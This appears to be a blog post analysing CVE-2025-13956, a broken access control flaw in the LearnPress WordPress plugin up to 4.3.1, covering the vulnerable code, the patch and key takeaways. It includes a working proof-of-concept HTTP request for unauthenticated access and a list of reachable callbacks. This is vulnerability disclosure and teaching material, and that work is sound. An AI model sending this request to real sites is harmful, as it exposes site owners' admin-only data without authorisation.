# CVE-2025-13956 Analysis & POC


## CVE & Basic Info
The **LearnPress – WordPress LMS Plugin** for **WordPress** is affected by an **unauthorized data access vulnerability** due to a **lack of capability checks** in the **statistics function** in **all versions up to and including 4.3.1**. This allows **unauthenticated attackers** to view the plugin's **order statistics**, including **total revenue** and **order status counts**.

* **CVE ID**: [CVE-2025-13956](https://www.cve.org/CVERecord?id=CVE-2025-13956)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 4.3.1
* **Patched Versions**: 4.3.2
* **CVSS severity**: Low (5.3)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress LearnPress Plugin](https://wordpress.org/plugins/learnpress/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **LearnPress**:  
    * `4.3.1` – **vulnerable** * `4.3.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any diff tool.

## Analysis 
The plugin registered an action hook:

```php {title="learnpress.php v4.3.1" data-open=true hl_lines=[2,4]}
add_action(
  'init',
  function () {
    LoadContentViaAjax::catch_lp_ajax();
    LessonAjax::catch_lp_ajax();
    EditCurriculumAjax::catch_lp_ajax();
    EditQuizAjax::catch_lp_ajax();
    EditQuestionAjax::catch_lp_ajax();
    SendEmailAjax::catch_lp_ajax();
    OpenAiAjax::catch_lp_ajax();

    do_action( 'learn-press/register-ajax-handlers' );
  },
  11
);

```

The `init` hook is an early initialization hook in WordPress, which runs after WordPress has finished loading core components but before sending output to the browser => Any request from any user can trigger it.

`function () {}` is an anonymous function set as the callback for this hook.

On line 4, the static function `LoadContentViaAjax:catch_lp_ajax()` is called from the `LoadContentViaAjax` class:

```php {title="AbstractAjax.php v4.3.1" data-open=true hl_lines=[6,7,12,21,28]}
class LoadContentViaAjax extends AbstractAjax { ... }

abstract class AbstractAjax {
  public static function catch_lp_ajax() {
    if ( ! empty( $_REQUEST['lp-load-ajax'] ) ) {
      $action = $_REQUEST['lp-load-ajax'];
      $nonce  = $_REQUEST['nonce'] ?? '';
      $class  = new static();

      // For case cache html, so cache nonce is not required.
      $class_no_nonce = [
        LoadContentViaAjax::class,
      ];

      if ( ! wp_verify_nonce( $nonce, 'wp_rest' ) ) {
        if ( ! in_array( get_class( $class ), $class_no_nonce ) ) {
          wp_die( 'Invalid request!', 400 );
        } else {
          // Allow to handle without nonce, but must same domain.
          $referer = wp_get_referer();
          if ( empty( $referer ) || strpos( $referer, home_url() ) !== 0 ) {
            wp_die( 'Invalid request!', 400 );
          }
        }
      }

      if ( is_callable( [ $class, $action ] ) ) {
        call_user_func( [ $class, $action ] );
      }
    }
  }
}

```

1. **Inherited Class**
```php
class LoadContentViaAjax extends AbstractAjax

```


→ `LoadContentViaAjax` inherits all AJAX processing logic from `AbstractAjax`.
2. **Hook `init` calls `catch_lp_ajax()**`
* When WordPress reaches the `init` hook
* `LoadContentViaAjax::catch_lp_ajax()` is executed.


3. **Request Check**
```php
if ( ! empty( $_REQUEST['lp-load-ajax'] ) )

```


→ Only processes when the request has the `lp-load-ajax` parameter.
4. **Action Determination**
```php
$action = $_REQUEST['lp-load-ajax'];

```


→ This value is treated as the **method name** to be called in the child class.
5. **Object Initialization**
```php
$class = new static();

```


→ `static` refers to the class currently being called (`LoadContentViaAjax`), so it creates an instance of that class.
6. **Nonce Handling**
* Retrieves `nonce` from the request
* Checks it using `wp_verify_nonce`
* Specifically, `LoadContentViaAjax` is allowed to **bypass the nonce**
* When bypassing the nonce, it checks if the `referer` is from the same domain.


7. **Call Corresponding Method**
```php
if ( is_callable( [ $class, $action ] ) ) {
    call_user_func( [ $class, $action ] );
}

```


→ If `LoadContentViaAjax` has a method with the same name as the `lp-load-ajax` value
→ That method will be called and executed.

```php {title="AbstractAjax.php v4.3.1" data-open=true hl_lines=[6,19,20,27,28,31,42]}
class LoadContentViaAjax extends AbstractAjax {
  public function load_content_via_ajax() {
    $response = new LP_REST_Response();

    try {
      $params = wp_unslash( $_REQUEST['data'] ?? '' );
      if ( empty( $params ) ) {
        throw new Exception( 'Error: params invalid!' );
      }

      $params = LP_Helper::json_decode( $params, true );

      if ( empty( $params['callback'] ) ||
        ! isset( $params['args'] ) ) {
        throw new Exception( 'Error: params invalid!' );
      }

      // @var array $args
      $args     = $params['args'];
      $callBack = $params['callback'];

      if ( empty( $callBack['class'] ) ||
        empty( $callBack['method'] ) ) {
        throw new Exception( 'Error: callback invalid!' );
      }

      $class  = $callBack['class'];
      $method = $callBack['method'];

      // Security: check callback is registered.
      $allow_callbacks = apply_filters(
        'lp/rest/ajax/allow_callback',
        []
      );
      $callBackStr     = $class . ':' . $method;
      if ( ! in_array( $callBackStr, $allow_callbacks ) ) {
        throw new Exception( 'Error: callback is not register!' );
      }

      // Check class and method is callable.
      if ( is_callable( [ $class, $method ] ) ) {
        $data = call_user_func( [ $class, $method ], $args );
      } else {
        throw new Exception( 'Error: callback is not callable!' );
      }

      if ( ! $data instanceof stdClass && ! isset( $data->content ) ) {
        throw new Exception( 'Error: data content invalid!' );
      }

      $response->message = $data->message ?? '';
      unset( $data->message );

      $response->status = 'success';
      $response->data   = $data;
    } catch ( Throwable $e ) {
      $response->status  = 'error';
      $response->message = $e->getMessage();
    }

    wp_send_json( $response );
  }
}

```

The necessary variables for `call_user_func` are formed directly from this code snippet and linked together according to the processing flow:

```php
$params = LP_Helper::json_decode( $params, true );

```

The `$params` variable is the input data array after decoding JSON from the request, which must contain callback information and parameters.

```php
$args     = $params['args'];
$callBack = $params['callback'];

```

`$args` contains the parameters to be passed to the called function, while `$callBack` describes the callback to be executed.

```php
$class  = $callBack['class'];
$method = $callBack['method'];

```

These two variables exactly identify the **class** and **method** to be called dynamically.

```php
$callBackStr = $class . ':' . $method;

```

This string is used to verify against the list of allowed callbacks in `$allow_callbacks`.

A series of callbacks are registered for the `lp/rest/ajax/allow_callback` filter via the `add_filter` function:

```php
public function allow_callback( array $callbacks ): array {
  $callbacks[] = get_class( $this ) . ':render_edit_quiz';
  $callbacks[] = get_class( $this ) . ':render_list_items_not_assign';

  return $callbacks;
}

```

The function receives the existing `$callbacks` array, then appends two strings in the format `ClassName:method` for the current class, and returns the array for WordPress to use as a list of valid callbacks. When debugging, we can see all registered callbacks:

```php
if ( is_callable( [ $class, $method ] ) ) {
    $data = call_user_func( [ $class, $method ], $args );
}

```

The array `[ $class, $method ]` is precisely the valid callback required by `call_user_func`. When the `is_callable` condition is true, WordPress calls the `$method` of class `$class` and passes the `$args` variable as the sole parameter to that method.

> [!BUG]
> **The vulnerability arises because the API does not perform any capability/permission checks.** This allows any user – including those without administrative privileges – to call the endpoint and request the execution of any callback in the valid callback list, even if those callbacks should be restricted to admins.

**The patch (v4.3.2)** adds a permission validation step to the `load_content_via_ajax` function by hardcoding the list of allowed callbacks:

```php
$allow_callbacks = apply_filters(
    'lp/rest/ajax/allow_callback',
    [
        'LP_Admin_Dashboard:order_statistic',
        'LP_Admin_Dashboard:plugin_status_content',
    ]
);

```

Only callbacks whose class and method names exactly match `'LP_Admin_Dashboard:order_statistic'` or `'LP_Admin_Dashboard:plugin_status_content'` will pass the check.

Both `order_statistic` and `plugin_status_content` functions have a mechanism to check for Administrator privileges before execution:

```php
if ( ! current_user_can( UserModel::ROLE_ADMINISTRATOR ) ) {
  wp_die( esc_html__( 'You do not have sufficient permissions to access this page.', 'learnpress' ) );
}
```

As a result, the vulnerability is fully secured.

## Flow
{{< mermaid >}}
flowchart TD

A["Unauthenticated attacker"]
--> B["Send request with lp-load-ajax parameter"]
B --> C["LoadContentViaAjax::catch_lp_ajax() triggered via init hook"]
C --> D["Check lp-load-ajax parameter exists"]
D --> E["Create instance of LoadContentViaAjax"]
E --> F["Class in $class_no_nonce whitelist → Skip nonce check"]
F --> G["Retrieve $class and $method from request data"]
G --> H["Check if $class:$method is in $allow_callbacks (all callbacks allowed)"]
H --> I["is_callable([class, method])?"]
I -->|Yes| J["Execute callback via call_user_func([class, method], args)"]
J --> K["Sensitive admin-only data returned to attacker"]

{{< /mermaid >}}

## Proof of Concept (PoC)
Send a request with an Unauthenticated user:

```http
POST / HTTP/1.1
Host: localhost
Referer: http://localhost

lp-load-ajax=load_content_via_ajax&data={"callback":{"class":"LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate","method":"render_list_items_not_assign"},"args":{"quiz_id":483}}
```

**Other valid callback lists:**

```php {data-open=true}
LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses
LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses
LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments
LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent
LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum
LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign
LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz
LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign
LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question
LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items
LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses
LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses
LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses
LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses
```

## Conclusion
The **Broken Access Control** vulnerability in LearnPress <= 4.3.1 allows **unauthenticated attackers** to execute AJAX callbacks that were intended only for admins. The issue occurs because the API does not check **capability/permission** before calling `call_user_func([class, method], args)`. Patch 4.3.2 has limited the valid callbacks and requires Administrator privileges, preventing unauthorized access.

## Key Takeaways
* Never allow dynamic callbacks to execute without checking permissions.
* The `lp-load-ajax` endpoint can become a vulnerability if the callback list is not restricted.
* Always validate `nonce` or check **referer/domain** to reduce risks from invalid requests.
* Patches should **hardcode the callback list** and combine it with admin privilege checks for sensitive functions.
* Broken Access Control often occurs in AJAX/REST APIs when developers trust input data from the client.

## References 
[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress LearnPress Plugin <= 4.3.1 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-wordpress-lms-plugin-plugin-4-3-1-missing-authorization-to-unauthenticated-orders-statistics-exposure-vulnerability)


---

> Author: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/posts/2025-12-16-cve-2025-13956/  

